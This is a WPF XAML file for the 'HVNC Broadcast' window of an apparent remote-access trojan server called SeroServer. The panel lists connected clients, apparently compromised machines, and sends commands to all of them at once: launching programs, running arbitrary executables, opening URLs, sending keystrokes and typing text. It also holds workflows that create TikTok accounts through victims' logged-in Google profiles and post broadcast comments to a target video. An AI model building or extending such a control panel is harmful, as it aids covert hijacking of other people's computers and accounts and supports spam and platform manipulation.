<Window x:Class="SeroServer.UI.HvncBroadcastWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="HVNC Broadcast"
        Width="680" Height="580" MinWidth="520" MinHeight="440"
        WindowStartupLocation="CenterOwner"
        ResizeMode="CanResize"
        WindowStyle="None"
        AllowsTransparency="True"
        Background="Transparent">

    <Border CornerRadius="8" BorderThickness="1" ClipToBounds="True" x:Name="RootBorder">
        <Border.Background><SolidColorBrush Color="#0C0D18"/></Border.Background>
        <Border.BorderBrush>
            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                <GradientStop Color="#2A2E50" Offset="0"/>
                <GradientStop Color="#141628" Offset="1"/>
            </LinearGradientBrush>
        </Border.BorderBrush>
        <Border.Effect>
            <DropShadowEffect Color="#000" BlurRadius="36" ShadowDepth="0" Opacity="0.80"/>
        </Border.Effect>

        <DockPanel LastChildFill="True">
            <Rectangle DockPanel.Dock="Top" Height="2" IsHitTestVisible="False">
                <Rectangle.Fill>
                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                        <GradientStop Color="#7C5CE8" Offset="0"/>
                        <GradientStop Color="#4A85F5" Offset="1"/>
                    </LinearGradientBrush>
                </Rectangle.Fill>
            </Rectangle>

            <!-- Title bar -->
            <Border DockPanel.Dock="Top" Height="40" Background="#111222"
                    MouseLeftButtonDown="Window_MouseLeftButtonDown">
                <Grid Margin="14,0">
                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                        <StackPanel Orientation="Vertical" VerticalAlignment="Center">
                            <TextBlock FontSize="11" FontWeight="SemiBold" FontFamily="Segoe UI">
                                <TextBlock.Foreground>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                        <GradientStop Color="#7AAEFF" Offset="0"/>
                                        <GradientStop Color="#B090FF" Offset="1"/>
                                    </LinearGradientBrush>
                                </TextBlock.Foreground>
                                <Run Text="HVNC Broadcast"/>
                            </TextBlock>
                            <TextBlock x:Name="TxtCount" Text="" FontSize="10" FontFamily="Segoe UI Mono">
                                <TextBlock.Foreground>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                        <GradientStop Color="#C0CCD8" Offset="0"/>
                                        <GradientStop Color="#6A8099" Offset="0.5"/>
                                        <GradientStop Color="#B0C0D0" Offset="1"/>
                                    </LinearGradientBrush>
                                </TextBlock.Foreground>
                            </TextBlock>
                        </StackPanel>
                    </StackPanel>
                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                        <Button x:Name="BtnMax" Content="☐" Width="30" Height="28" Margin="0,0,4,0"
                                Style="{StaticResource SBtn}" FontSize="13" Padding="0" Click="BtnMax_Click"/>
                        <Button Content="✕" Width="30" Height="28"
                                Style="{StaticResource SRedBtn}" FontSize="11" Padding="0" Click="Close_Click"/>
                    </StackPanel>
                </Grid>
            </Border>

            <!-- Status bar -->
            <Border DockPanel.Dock="Bottom" Height="28" Background="#111222"
                    BorderBrush="#1A1C2E" BorderThickness="0,1,0,0">
                                <Grid>
<TextBlock x:Name="TxtStatus" Text="Select clients and send a command"
                           Foreground="#404868" FontSize="11" FontFamily="Consolas"
                           VerticalAlignment="Center" Margin="14,0"/>
                    <Thumb Width="14" Height="14" HorizontalAlignment="Right" VerticalAlignment="Center"
                           Margin="0,0,4,0" Cursor="SizeNWSE" DragDelta="ResizeGrip_DragDelta">
                        <Thumb.Template>
                            <ControlTemplate TargetType="Thumb">
                                <Path Data="M2,12 L12,2 M5,12 L12,5 M9,12 L12,9"
                                      Stroke="#4A85F5" StrokeThickness="1.2" Opacity="0.6"/>
                            </ControlTemplate>
                        </Thumb.Template>
                    </Thumb>
                </Grid>
            </Border>

            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="210"/>
                    <ColumnDefinition Width="4"/>
                    <ColumnDefinition Width="*"/>
                </Grid.ColumnDefinitions>

                <!-- Left: client list -->
                <Border Grid.Column="0" Background="#0A0B14" BorderBrush="#1A1C2E" BorderThickness="0,0,1,0">
                    <DockPanel LastChildFill="True">
                        <Border DockPanel.Dock="Top" Background="#111222" BorderBrush="#1A1C2E"
                                BorderThickness="0,0,0,1" Padding="10,6">
                            <Grid>
                                <TextBlock Text="CLIENTS" FontSize="9" FontWeight="Bold"
                                           Foreground="#C07C5CE8" FontFamily="Consolas" VerticalAlignment="Center"/>
                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
                                    <Button Content="All" Height="20" Padding="8,0" Margin="0,0,4,0"
                                            Style="{StaticResource SBtn}" FontSize="9" Click="BtnSelectAll_Click"/>
                                    <Button Content="None" Height="20" Padding="8,0"
                                            Style="{StaticResource SBtn}" FontSize="9" Click="BtnSelectNone_Click"/>
                                </StackPanel>
                            </Grid>
                        </Border>
                        <ListBox x:Name="ClientList" Background="Transparent" BorderThickness="0"
                                 Foreground="#C0CCDD" FontFamily="Segoe UI" FontSize="12">
                            <ListBox.ItemContainerStyle>
                                <Style TargetType="ListBoxItem">
                                    <Setter Property="Background" Value="Transparent"/>
                                    <Setter Property="Padding" Value="8,5"/>
                                    <Setter Property="BorderThickness" Value="0"/>
                                    <Setter Property="Template">
                                        <Setter.Value>
                                            <ControlTemplate TargetType="ListBoxItem">
                                                <Border x:Name="bd" Background="{TemplateBinding Background}" Padding="{TemplateBinding Padding}">
                                                    <ContentPresenter/>
                                                </Border>
                                                <ControlTemplate.Triggers>
                                                    <Trigger Property="IsMouseOver" Value="True">
                                                        <Setter TargetName="bd" Property="Background" Value="#111830"/>
                                                    </Trigger>
                                                </ControlTemplate.Triggers>
                                            </ControlTemplate>
                                        </Setter.Value>
                                    </Setter>
                                </Style>
                            </ListBox.ItemContainerStyle>
                            <ListBox.ItemTemplate>
                                <DataTemplate>
                                    <CheckBox IsChecked="{Binding Selected, Mode=TwoWay}"
                                              Content="{Binding Label}"
                                              Foreground="#C0CCDD" FontSize="11"
                                              Checked="Client_CheckChanged"
                                              Unchecked="Client_CheckChanged">
                                        <CheckBox.Style>
                                            <Style TargetType="CheckBox">
                                                <Setter Property="Cursor" Value="Hand"/>
                                            </Style>
                                        </CheckBox.Style>
                                    </CheckBox>
                                </DataTemplate>
                            </ListBox.ItemTemplate>
                        </ListBox>
                    </DockPanel>
                </Border>

                <!-- Splitter -->
                <GridSplitter Grid.Column="1" Width="4" Background="#0F1020"
                              HorizontalAlignment="Stretch" Cursor="SizeWE"/>

                <!-- Right: actions -->
                <ScrollViewer Grid.Column="2" VerticalScrollBarVisibility="Auto">
                <StackPanel Margin="14,12">

                    <!-- Launch app -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <TextBlock Text="LAUNCH APP ON ALL SELECTED" FontSize="9" FontWeight="Bold"
                                       Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <StackPanel Orientation="Horizontal">
                                <ComboBox x:Name="CmbApp" Style="{StaticResource SCombo}" Width="180" Height="28" Margin="0,0,8,0"/>
                                <Button Content="Launch" Height="28" Padding="14,0"
                                        Style="{StaticResource SGreenBtn}" FontSize="11" Click="BtnLaunch_Click"/>
                            </StackPanel>
                        </StackPanel>
                    </Border>

                    <!-- Custom exe -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <TextBlock Text="CUSTOM EXECUTABLE PATH" FontSize="9" FontWeight="Bold"
                                       Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <StackPanel Orientation="Horizontal">
                                <TextBox x:Name="TxtCustomPath" Style="{StaticResource STxt}" Height="28"
                                         Width="240" Margin="0,0,8,0" FontSize="11"
                                         ToolTip="Path on the client machines (env vars expanded)"/>
                                <Button Content="Execute" Height="28" Padding="14,0"
                                        Style="{StaticResource SBtn}" FontSize="11" Click="BtnExec_Click"/>
                            </StackPanel>
                        </StackPanel>
                    </Border>

                    <!-- Open URL -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <TextBlock Text="OPEN URL" FontSize="9" FontWeight="Bold"
                                       Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <StackPanel Orientation="Horizontal">
                                <TextBox x:Name="TxtUrl" Style="{StaticResource STxt}" Height="28"
                                         Width="240" Margin="0,0,8,0" FontSize="11"/>
                                <Button Content="Open" Height="28" Padding="14,0"
                                        Style="{StaticResource SBtn}" FontSize="11" Click="BtnOpenUrl_Click"/>
                            </StackPanel>
                        </StackPanel>
                    </Border>

                    <!-- Type text / keyboard shortcut -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <TextBlock Text="SEND KEYBOARD SHORTCUT" FontSize="9" FontWeight="Bold"
                                       Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <WrapPanel>
                                <Button Content="Ctrl+A" Height="26" Padding="10,0" Margin="0,0,5,5"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="Ctrl+A"/>
                                <Button Content="Ctrl+C" Height="26" Padding="10,0" Margin="0,0,5,5"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="Ctrl+C"/>
                                <Button Content="Ctrl+V" Height="26" Padding="10,0" Margin="0,0,5,5"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="Ctrl+V"/>
                                <Button Content="Enter" Height="26" Padding="10,0" Margin="0,0,5,5"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="Enter"/>
                                <Button Content="Escape" Height="26" Padding="10,0" Margin="0,0,5,5"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="Escape"/>
                                <Button Content="Tab" Height="26" Padding="10,0" Margin="0,0,5,5"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="Tab"/>
                                <Button Content="F5" Height="26" Padding="10,0" Margin="0,0,5,5"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="F5"/>
                            </WrapPanel>
                        </StackPanel>
                    </Border>

                    <!-- Type text and send -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <TextBlock Text="TYPE TEXT" FontSize="9" FontWeight="Bold"
                                       Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <StackPanel Orientation="Horizontal">
                                <TextBox x:Name="TxtTypeText" Style="{StaticResource STxt}" Height="28"
                                         Width="240" Margin="0,0,8,0" FontSize="12"
                                         ToolTip="Text to type on all selected HVNC sessions"/>
                                <Button Content="Type" Height="28" Padding="14,0"
                                        Style="{StaticResource SBtn}" FontSize="11" Click="BtnTypeText_Click"/>
                            </StackPanel>
                        </StackPanel>
                    </Border>

                    <!-- TikTok workflow -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#0A080F" BorderThickness="1" BorderBrush="#2A1840">
                        <StackPanel>
                            <TextBlock Text="♪  TIKTOK SIGNUP WORKFLOW" FontSize="9" FontWeight="Bold"
                                       Foreground="#C0f38ba8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <TextBlock TextWrapping="Wrap" Foreground="#404868" FontSize="10" FontFamily="Segoe UI"
                                       Margin="0,0,0,10"
                                       Text="Opens Chrome with the existing profile (Google already logged in) then navigates to TikTok signup. You then view each HVNC and click Continue with Google."/>
                            <WrapPanel>
                                <Button Content="1. Open Chrome" Height="28" Padding="12,0" Margin="0,0,6,6"
                                        Style="{StaticResource SGreenBtn}" FontSize="10" Click="BtnTtStep1_Click"
                                        ToolTip="Launch Chrome with existing Google profile on all selected machines"/>
                                <Button Content="2. TikTok Signup" Height="28" Padding="12,0" Margin="0,0,6,6"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnTtStep2_Click"
                                        ToolTip="Navigate to https://www.tiktok.com/signup"/>
                                <Button Content="3. Tab → Enter" Height="28" Padding="12,0" Margin="0,0,6,6"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnTtStep3_Click"
                                        ToolTip="Tab to Continue with Google button + Enter (may vary by layout)"/>
                                <Button Content="4. F5 Refresh" Height="28" Padding="12,0" Margin="0,0,0,6"
                                        Style="{StaticResource SBtn}" FontSize="10" Click="BtnKey_Click" Tag="F5"/>
                            </WrapPanel>
                        </StackPanel>
                    </Border>

                    <!-- TikTok comment broadcast -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#0A080F" BorderThickness="1" BorderBrush="#2A1840">
                        <StackPanel>
                            <TextBlock Text="♪  TIKTOK COMMENT BROADCAST" FontSize="9" FontWeight="Bold"
                                       Foreground="#C0f38ba8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <TextBlock Text="Target URL (video or live)" Style="{StaticResource SFieldLabel}"/>
                            <TextBox x:Name="TxtTtTargetUrl" Style="{StaticResource STxt}" Height="28"
                                     FontSize="11" Margin="0,0,0,8"
                                     ToolTip="Full TikTok video or livestream URL"/>
                            <TextBlock Text="Comment text" Style="{StaticResource SFieldLabel}"/>
                            <TextBox x:Name="TxtTtBroadcastComment" Style="{StaticResource STxt}" Height="28"
                                     FontSize="12" Margin="0,0,0,10"
                                     ToolTip="Comment to post on all selected machines"/>
                            <WrapPanel>
                                <Button Content="1. Navigate" Height="28" Padding="12,0" Margin="0,0,6,6"
                                        Style="{StaticResource SBtn}" FontSize="10"
                                        Click="BtnTtCmt1_Click"
                                        ToolTip="Open the target URL on all selected HVNC sessions"/>
                                <Button Content="2. Focus chat" Height="28" Padding="12,0" Margin="0,0,6,6"
                                        Style="{StaticResource SBtn}" FontSize="10"
                                        Click="BtnTtCmt2_Click"
                                        ToolTip="Press Tab×6 to reach the comment box"/>
                                <Button Content="3. Type &amp; Submit" Height="28" Padding="12,0" Margin="0,0,0,6"
                                        Style="{StaticResource SGreenBtn}" FontSize="10"
                                        Click="BtnTtCmt3_Click"
                                        ToolTip="Type the comment and press Enter"/>
                            </WrapPanel>
                        </StackPanel>
                    </Border>

                    <!-- Log -->
                    <Border Padding="12,10" CornerRadius="6"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <Grid Margin="0,0,0,8">
                                <TextBlock Text="LOG" FontSize="9" FontWeight="Bold"
                                           Foreground="#C07C5CE8" FontFamily="Consolas" VerticalAlignment="Center"/>
                                <Button Content="Clear" Height="20" Padding="8,0" HorizontalAlignment="Right"
                                        Style="{StaticResource SBtn}" FontSize="9" Click="BtnClearLog_Click"/>
                            </Grid>
                            <Border Background="#05060E" CornerRadius="4" Height="100">
                                <ScrollViewer x:Name="LogScroll" VerticalScrollBarVisibility="Auto">
                                    <TextBox x:Name="TxtLog"
                                             Background="Transparent" Foreground="#C8D0E8"
                                             FontFamily="Consolas" FontSize="11"
                                             BorderThickness="0" Padding="8,6"
                                             IsReadOnly="True" TextWrapping="Wrap" AcceptsReturn="True"/>
                                </ScrollViewer>
                            </Border>
                        </StackPanel>
                    </Border>

                </StackPanel>
                </ScrollViewer>
            </Grid>
        </DockPanel>
    </Border>
</Window>
